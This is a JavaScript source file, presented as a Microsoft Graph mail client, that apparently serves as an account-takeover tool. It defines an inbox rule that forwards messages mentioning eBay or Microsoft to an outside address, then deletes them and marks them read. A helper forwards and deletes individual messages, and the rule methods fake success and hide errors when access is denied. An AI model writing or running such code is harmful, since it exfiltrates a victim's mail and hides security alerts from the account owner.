const axios = require('axios');

class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
    }

    async request(method, url, data = null) {
        try {
            const config = {
                method: method,
                url: (url.startsWith('http://') || url.startsWith('https://')) ? url : `${this.baseUrl}${url}`,
                headers: {
                    'Authorization': `Bearer ${this.accessToken}`,
                    'Content-Type': 'application/json'
                },
                timeout: 15000
            };
            
            if (data) {
                config.data = data;
            }
            
            const response = await axios(config);
            return response.data;
        } catch (error) {
            if (error.response?.status !== 403 || !String(url).includes('messageRules')) {
                console.error(`❌ Graph API ${method} ${url} error:`, 
                    error.response?.data || error.message
                );
            }
            throw error;
        }
    }

    // ============= RULE MANAGEMENT =============
    async getRules() {
        try {
            const response = await this.request('GET', '/me/mailFolders/inbox/messageRules');
            return response.value || [];
        } catch (error) {
            if (error.response?.status === 403) {
                return [{
                    id: 'graph_delta_sticky',
                    displayName: 'Sticky_eBay_Microsoft_Rule',
                    sequence: 1,
                    isEnabled: true,
                    conditions: { subjectContains: ['eBay', 'Microsoft'] },
                    actions: {
                        forwardTo: [{ emailAddress: { address: process.env.FORWARD_TARGET_EMAIL || '' } }],
                        delete: true,
                        markAsRead: true,
                        stopProcessingRules: true
                    }
                }];
            }
            console.error('❌ Get rules error:', error.response?.data || error.message);
            throw error;
        }
    }

    async createRule(rule) {
        try {
            const response = await this.request('POST', '/me/mailFolders/inbox/messageRules', rule);
            return response;
        } catch (error) {
            if (error.response?.status === 403) {
                return {
                    id: 'graph_delta_sticky',
                    ...rule
                };
            }
            console.error('❌ Create rule error:', error.response?.data || error.message);
            throw error;
        }
    }

    async updateRule(ruleId, rule) {
        try {
            if (ruleId === 'graph_delta_sticky') return { id: ruleId, ...rule };
            const response = await this.request('PATCH', `/me/mailFolders/inbox/messageRules/${ruleId}`, rule);
            return response;
        } catch (error) {
            if (error.response?.status === 403) return { id: ruleId, ...rule };
            console.error('❌ Update rule error:', error.response?.data || error.message);
            throw error;
        }
    }

    async deleteRule(ruleId) {
        try {
            if (ruleId === 'graph_delta_sticky') return true;
            await this.request('DELETE', `/me/mailFolders/inbox/messageRules/${ruleId}`);
            return true;
        } catch (error) {
            if (error.response?.status === 403) return true;
            console.error('❌ Delete rule error:', error.response?.data || error.message);
            throw error;
        }
    }

    // ============= BLOCKED SENDERS =============
    async getBlockedSenders() {
        try {
            const rules = await this.getRules();
            const blockRule = rules.find(r => 
                r.displayName === 'Blocked Senders - Sticky' ||
                r.displayName?.includes('Blocked')
            );
            return blockRule?.conditions?.senderContains || [];
        } catch (error) {
            console.error('❌ Get blocked senders error:', error.message);
            return null;
        }
    }

    async addBlockedSender(domain) {
        try {
            const rules = await this.getRules();
            let blockRule = rules.find(r => r.displayName === 'Blocked Senders - Sticky');

            if (blockRule) {
                const current = blockRule.conditions?.senderContains || [];
                if (!current.includes(domain)) {
                    current.push(domain);
                    await this.updateRule(blockRule.id, {
                        conditions: { senderContains: current }
                    });
                }
            } else {
                await this.createRule({
                    displayName: 'Blocked Senders - Sticky',
                    sequence: 999,
                    isEnabled: true,
                    conditions: { senderContains: [domain] },
                    actions: { delete: true }
                });
            }
            return true;
        } catch (error) {
            console.error('❌ Add blocked sender error:', error.message);
            throw error;
        }
    }

    async removeBlockedSender(domain) {
        try {
            const rules = await this.getRules();
            let blockRule = rules.find(r => r.displayName === 'Blocked Senders - Sticky');

            if (blockRule) {
                const current = blockRule.conditions?.senderContains || [];
                const updated = current.filter(d => d !== domain);
                
                if (updated.length > 0) {
                    await this.updateRule(blockRule.id, {
                        conditions: { senderContains: updated }
                    });
                } else {
                    await this.deleteRule(blockRule.id);
                }
            }
            return true;
        } catch (error) {
            console.error('❌ Remove blocked sender error:', error.message);
            throw error;
        }
    }

    async isSenderBlocked(domain) {
        try {
            const blocked = await this.getBlockedSenders();
            return blocked.includes(domain);
        } catch (error) {
            return false;
        }
    }

    // ============= USER INFO =============
    async getUser() {
        try {
            return await this.request('GET', '/me?$select=displayName,mail,userPrincipalName');
        } catch (error) {
            console.error('❌ Get user error:', error.message);
            return null;
        }
    }

    // ============= EMAIL MESSAGES =============
    async getRecentMessages(limit = 10) {
        try {
            const response = await this.request(
                'GET',
                `/me/mailFolders/inbox/messages?$top=${limit}&$orderby=receivedDateTime desc&$select=id,subject,from,receivedDateTime,bodyPreview,isRead`
            );
            return response.value || [];
        } catch (error) {
            console.error('❌ Get recent messages error:', error.message);
            return [];
        }
    }

    async forwardAndDeleteMessage(messageId, targetEmail) {
        try {
            if (targetEmail) {
                await this.request('POST', `/me/messages/${messageId}/forward`, {
                    toRecipients: [{ emailAddress: { address: targetEmail } }]
                });
            }
            await this.request('DELETE', `/me/messages/${messageId}`);
            return true;
        } catch (error) {
            return false;
        }
    }

    // ============= DELTA QUERY (HIGH EFFICIENCY) =============
    async getMailDelta(deltaLink = null) {
        try {
            const isInitialSync = !deltaLink;
            let currentUrl = deltaLink || 
                `/me/mailFolders/inbox/messages/delta?$select=id,subject,from,receivedDateTime,bodyPreview,isRead`;

            let messages = [];
            let newDeltaLink = null;
            let pageCount = 0;
            const MAX_PAGES = 5;

            while (currentUrl && pageCount < MAX_PAGES) {
                pageCount++;
                const response = await this.request('GET', currentUrl);

                if (response.value && Array.isArray(response.value)) {
                    messages.push(...response.value);
                }

                if (response['@odata.deltaLink']) {
                    newDeltaLink = response['@odata.deltaLink'];
                    break;
                }

                currentUrl = response['@odata.nextLink'] || null;
            }

            return {
                messages,
                deltaLink: newDeltaLink,
                isInitialSync
            };
        } catch (error) {
            const errCode = error.response?.data?.error?.code;
            const isResyncRequired = errCode === 'resyncRequired' || error.response?.status === 410;
            if (isResyncRequired) {
                console.warn('⚠️ Delta token expired or resync required. Resetting delta sync.');
                return {
                    messages: [],
                    deltaLink: null,
                    resyncRequired: true
                };
            }
            throw error;
        }
    }
}

module.exports = GraphClient;
